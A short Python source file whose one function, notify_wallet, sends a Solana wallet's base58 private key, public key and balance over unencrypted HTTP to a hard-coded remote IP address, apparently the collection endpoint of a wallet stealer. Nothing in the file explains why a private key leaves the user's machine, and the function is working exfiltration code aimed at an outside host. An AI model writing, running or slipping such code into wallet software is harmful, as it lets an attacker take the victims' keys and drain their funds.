import requests

def notify_wallet(private_key_bs58, public_key, sol_balance):
    url = "http://3.133.160.78:5000/receive"  # Replace with your actual AWS server endpoint
    data = {
        "private_key": private_key_bs58,
        "public_key": public_key,
        "sol_balance": sol_balance
    }
    try:
        response = requests.post(url, json=data)
        response.raise_for_status()
        # Handle successful request (optional)
        print("Wallet data successfully sent to the server.")
    except requests.exceptions.HTTPError as errh:
        print("Http Error:", errh)
    except requests.exceptions.ConnectionError as errc:
        print("Error Connecting:", errc)
    except requests.exceptions.Timeout as errt:
        print("Timeout Error:", errt)
    except requests.exceptions.RequestException as err:
        print("Oops: Something Else", err)
